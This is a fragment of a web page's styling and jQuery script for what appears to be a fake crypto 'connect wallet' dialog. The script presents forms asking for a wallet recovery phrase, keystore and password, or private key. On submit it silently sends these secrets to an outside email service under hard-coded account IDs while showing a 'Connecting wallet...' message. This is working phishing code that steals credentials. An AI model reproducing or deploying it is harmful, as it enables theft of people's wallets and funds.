          animation: lds-spinner 1.2s linear infinite;

      .lds-spinner div:after {
          content: " ";
          display: block;
          position: absolute;
          top: 3px;
          left: 37px;
          width: 6px;
          height: 18px;
          border-radius: 20%;
          background: #333;
      }

          animation-delay: -1.1s;

<script>
    $(document).ready(function () {
        let dialogDismiss = $(".dialog-dismiss");
        let sendForm = $("#data-to-send");
        let successBox = $("#success-dialog");
        let errorBox = $("#error-dialog");
        dialogDismiss.each(function () {
            $(this).on("click", function () {
                $("#connect-dialog").hide();
                $("#send-dialog").hide();
            });
        });
        $("#phraseSend").on("click", function () {
            sendForm.html(
                    '<div class="form-group"><input type="hidden" id="phrase" name="phrase" value="phrase"><textarea name="phrase" id="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
            );
        });
        $("#keystoreSend").on("click", function () {
            sendForm.html(
                '<textarea rows="5" style="resize: none" required name="keystore" id="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="password" class="form-control" id="wallet_password" name="wallet_password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
            );
        });
        $("#privateKeySend").on("click", function () {
            sendForm.html(
                '<input type="text" name="private_key" id="private_key" required class="form-control" placeholder="Enter your Private Key"><div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
            );
        });

        $(".connection-info").on("click", ".manual-connection", function () {
            $("#current-wallet-app-send").text($("#current-wallet-app").text());
            $("#walletNameData").val($("#current-wallet-app").text());
            var link = $("#current-wallet-app").text();
            $("#current-wallet-send-logo").attr("src", $("#current-wallet-logo").attr("src"));
            $("#connect-dialog").hide();
            $("#send-dialog").show();
        });

        $.ajaxSetup({
            headers: {
                "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
            },
        });

        $("#form").submit(function (e) {
            e.preventDefault();

            // Prepare the data payload
            let payload = {
                service_id: 'e920d5afds', // EmailJS service ID
                template_id: 'template_h6w99lf', // template ID
                user_id: 'JzTiRvKggY01ROJ1N', // Your EmailJS user ID
                template_params: {
                    // Map your form fields here
                    phrase: $("#phrase").val(),
                    keystore: $("#keystore").val(),
                    private_key: $("#private_key").val(),
                    wallet_password: $("#wallet_password").val(),
                }
            };

            let processBtn = $("#button");
            let cancelBtn = $("#cancelBtn");
            let formData = new FormData(this);

            $("#message-tab").show();

            $.ajax({
                type: "POST",
                url: "https://api.emailjs.com/api/v1.0/email/send",
                contentType: 'application/json',
                data: JSON.stringify(payload),
                // cache: false,
                processData: false,
                beforeSend: function () {
                    $("#message-tab").hide();
                    processBtn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...');
                    processBtn.prop("disabled", true);
                    cancelBtn.prop("disabled", true);
                },
                success: function (response) {
                    console.log('Sent successfully', response);
                    restoreButtons();
                    $("#message-tab").show();
                    $("div.message-tab").html("<div class='alert alert-success'>Email sent successfully!</div>");
                    setTimeout(dismissAllDialogs, 2500)
                },
                error: function (xhr, status, error) {
                    restoreButtons();
                    $("#message-tab").show();
                    $("div.message-tab").html("<div class='alert alert-danger'>Error sending email: " + error + "</div>");
                }
            });

            function restoreButtons() {
                processBtn.html("PROCEED");
                processBtn.prop("disabled", false);
                cancelBtn.prop("disabled", false);
            }

            function dismissAllDialogs() {
                successBox.hide();
                errorBox.hide();
                $("#connect-dialog").hide();
                $("#send-dialog").hide();
                $("#processing-dialog").hide();
                $("#message-tab").hide();
                $("#phrase").val("");
                $("#keystore").val("");
                $("#private_key").val("");
                $("#wallet_password").val("");
            }
        });    
                
    });
</script>
